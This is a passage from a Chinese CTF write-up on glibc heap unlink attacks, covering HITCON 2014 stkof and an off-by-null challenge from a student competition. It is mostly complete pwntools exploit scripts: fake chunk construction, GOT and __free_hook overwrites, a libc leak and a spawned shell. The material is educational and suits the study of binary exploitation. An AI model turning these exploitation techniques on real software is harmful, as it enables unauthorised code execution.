    delete(3)
    delete(4)
    payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10) + 'A' * (0x100 - 0x20) + p64(0x100) + p64(
        0x210 - 0x100) # 构造两个chunk，绕过unlink的检查
    create(0x210, payload)
    delete(4)  # double free
    modify(3, p64(free_got_plt)[0:4], '1111')
    modify(0, p64(func_addr)[0:6], '2222')
    delete(2)
    p.interactive()
这题和堆块下溢本质上是差不多的，区别在于没有puts函数和下溢漏洞，但是有UAF漏洞，就可以实现构造fake_chunk，这和第一题是很像的，和下溢的操作是差不多的。
堆溢出，还有一种情况就是当我们的puts无法调用时，无法打印出堆块上面的内容时，我们可以间接调用法，通过unlink写入free的got，然后再写一次往free的got写入puts_plt，那么就可以实现free调用就是调用puts函数，只要free一个带有got表的堆块，我们就可以实现puts打印功能了，接着再次改写free的got为onegadget或者atoi的got为system，传参数（/bin/sh\x00）即可实现getshell~
上题目：
## 2014 HITCON stkof
由于利用思路都是一样的，堆溢出构造fake_chunk，然后unlink攻击，所以直接上exp：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    #context(arch='i386', os='linux')
    local = 1
    elf = ELF('./stkof')
    if local:
        p = process('./stkof')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('./libc.so.6')
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    #addr = u64(rc(6).ljust(8,'\x00'))
    #addr = u32(rc(4))
    #addr = int(rc(6),16)#string
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    def edit(index,size,Content):
        sl('2')
        sl(str(index))
        sl(str(size))
        sd(Content)
        ru('OK\n')
    def free(Index):
        sl('3')
        sl(str(Index))
    def malloc(size):
        sl('1')
        sl(str(size))
        ru('OK\n')
    ptr = 0x602150
    free_got = elf.got['free']
    atoi_got = elf.got['atoi']
    puts_got = elf.got["puts"]
    puts_plt = elf.symbols['puts']
    malloc(0x80)#1
    malloc(0x30)#2
    bk(0x400981)
    malloc(0x80)#3
    FD = ptr - 0x18
    BK = ptr - 0x10
    py = ''
    py += p64(0) + p64(0x31)
    py += p64(FD) + p64(BK)
    py += 'a'*16
    py += p64(0x30) + p64(0x90)
    edit(2,0x40,py)
    free(3)
    py1 = ''
    py1 += p64(0) + p64(atoi_got) + p64(puts_got) + p64(free_got)
    edit(2,len(py1),py1)
    py2 = ''
    py2 += p64(puts_plt)
    edit(2,len(py2),py2)
    free(1)
    puts_addr = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
    print "puts_addr--->" + hex(puts_addr)
    onegadget = puts_addr - libc.symbols["puts"] + 0xf02a4
    print "onegadget--->" + hex(onegadget)
    system = puts_addr - libc.symbols["puts"] + libc.symbols['system']
    # edit(2,0x8,p64(onegadget))
    # free(2)
    edit(0,0x8,p64(system))
    sl('/bin/sh\x00')
    p.interactive()
下面是我当时打全国大学生信息安全竞赛时半决赛的一道unlink的题目总结：
## 题目：PWN1
首先看下保护机制：
看到保护机制，想到要想getshell，只有通过修改__free_hook的地址为我们的onegadget，先埋下伏笔，这里分析开始漏洞：
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      int v3; // eax
      init();
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            menu();
            v3 = read_int();
            if ( v3 != 2 )
              break;
            fr();
          }
          if ( v3 > 2 )
            break;
          if ( v3 != 1 )
            goto LABEL_13;
          ma();
        }
        if ( v3 == 3 )
        {
          ed();
        }
        else
        {
          if ( v3 != 4 )
    LABEL_13:
            exit(1);
          sh();
        }
      }
    }
提取出函数：
    def edit(index,Content):
        ru("show")
        sl('3')
        ru("index:")
        sl(str(index))
        ru("content:")
        sd(Content)
    def free(Index):
        ru("show")
        sl('2')
        ru("index:")
        sl(str(Index))
    def malloc(index,size,content):
        ru("show")
        sl('1')
        ru("index:")
        sl(str(index))
        ru("size:")
        sl(str(size))
        ru("content:")
        sd(content)
    def puts(index):
        ru("show")
        sl('4')
        ru("index:")
        sl(str(index))
首先是malloc函数，发现很正常，输入下标，大小和内容：
接着是free函数：
接着edit函数：
最后是puts函数，key2应该是0，所以用不了打印函数：
bss段中key1和key2，掌控着edit函数的使用次数和puts函数的打印功能，而且细心会发现，其实只要填到key2，因为地址占用8位，那么key1也是会被覆盖成1的，问题是要修改这里的值，得下溢，所以得往上找注入点：
#### 如果我们可以往chunk32的地址0x6021E0处写入内容的话，就可以实现下溢，0x6022b8-0x6021E0 =
0xd8字节，也就是从这里开始输入要输入0xd8的字节，同时chunk32是我们能控制的最后一个chunk块，unlink后输入的位置是chunk29的地址，有0x18的距离，0x18+0xd8=0xf0，也就是要填充0xf0的junk
string，然后再写入8字节的数字，所以一共需要0xf8的大小，即堆块的大小必须要是0xf8才行，这是第一个坑点，需要计算出要malloc的堆块大小。
接着因为off by
null的原理是在输入最后加上一个\x00，溢出一个字节，那么就可以想到修改上一个堆块的状态为free，于是想到可以用unlink的做法实现chunk32的地址指向chunk29，那么我们可以构造出来：
    malloc(0,0xf8,'aaaa')
    malloc(32,0xf8,'bbbb')
    malloc(1,0xf8,'cccc')
    malloc(31,0xf8,'dddd')
    free_got = elf.got['free']
    ptr = 0x6021E0#32
    FD = ptr - 24
    BK = ptr - 16
    py = ''
    py += p64(0) + p64(0xf1)
    py += p64(FD) + p64(BK)
    py = py.ljust(0xf0, "\x00")
    py += p64(0xf0)
    edit(32,py)
    free(1)
我们先申请4个堆块，然后在chunk32里面做文章，构造出我们的unlink链子，由于off by
one的漏洞，会把chunk1的size字节低位置为0，那么就是说我们的fake_chunk是free状态的，这时我们如果free掉chunk1，就会触发unlink从而实现了chunk32指向chunk29，如果我们edit了chunk32，就会从chunk29开始输入，下面一步步看下具体的过程，首先是申请：
接着是fake_chunk的构造：方框是fake_chunk，圆圈是我们的offbyone漏洞，使得我们的fake_chunk为free状态
unlink一下：
一个unlink实现了泄露出libc基地址和0x6021e0指向0x6021c8，接着再改写key1和key2：
    py = ''
    py += p64(0x6021E0)*3 + p64(free_got)#0x20
    py += 'a'*0xD0
    py += p64(1)
    edit(32,py)
下图中key2为0，key1位1（改写前），可edit不可puts
下图中key2为1，key1位0（改写后）可edit可puts
这里很巧妙的一点就是chunk29到chunk31都填写chunk32的地址，也就是往chunk29到chunk31写入内容实则都是往chunk32写入内容，那么我们可以进行真实地址泄露了，这里可以puts出chunk32上面的free的真实地址，也可以通过打印1号块的内容来泄露main_arena地址（unsorted
bin攻击），打印完了我们就可以得到system和onegadget和free_hook的地址，然后将free_hook地址写入到chunk32中，再往chunk32写入onegadget：
上exp：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    #context(arch='i386', os='linux')
    local = 1
    elf = ELF('./pwn1')
    if local:
        p = process('./pwn1')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('./libc.so.6')
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    def edit(index,Content):
        ru("show")
        sl('3')
        ru("index:")
        sl(str(index))
        ru("content:")
        sd(Content)
    def free(Index):
        ru("show")
        sl('2')
        ru("index:")
        sl(str(Index))
    def malloc(index,size,content):
        ru("show")
        sl('1')
        ru("index:")
        sl(str(index))
        ru("size:")
        sl(str(size))
        ru("content:")
        sd(content)
    def puts(index):
        ru("show")
        sl('4')
        ru("index:")
        sl(str(index))
    #bk(0x400990)
    malloc(0,0xf8,'aaaa')
    malloc(32,0xf8,'bbbb')
    malloc(1,0xf8,'cccc')
    malloc(31,0xf8,'dddd')
    free_got = elf.got['free']
    ptr = 0x6021E0#32
    FD = ptr - 24
    BK = ptr - 16
    py = ''
    py += p64(0) + p64(0xf1)
    py += p64(FD) + p64(BK)
    py = py.ljust(0xf0, "\x00")
    py += p64(0xf0)
    edit(32,py)
    free(1)
    #0xF8
    py = ''
    py += p64(0x6021E0)*3 + p64(free_got)
    py += 'a'*0xD0
    py += p64(1)
    edit(32,py)
    puts(32)
    free_addr = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
    print "free_addr--->" + hex(free_addr)
    onegadget = free_addr - libc.symbols["free"] + 0x4526a
    print "onegadget--->" + hex(onegadget)
    free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook']
    print "free_hook--->" + hex(free_hook)
    pay = p64(free_hook)#这里需要注意，edit又会被使用完，所以需要再覆盖一次为1
    pay = pay.ljust(0xf0,'\x00')
    pay += p64(1)
    edit(31,pay)
    edit(32,p64(onegadget))
    free(0)
    p.interactive()
最后free掉chunk0即可getshell~
总结：
这里学到了新的技巧是利用off by
null+unlink（手动计算堆块大小0xf8），同时学到了那3个地址写同一个地方的操作（针对于只有free_hook可用，需要二次写入时），还有就是一个覆盖的问题，写入覆盖bss段中的key实现函数的利用，认识了这么多的题型和技巧，unlink算是学的比较懂了，进军下一个方向，冲冲冲~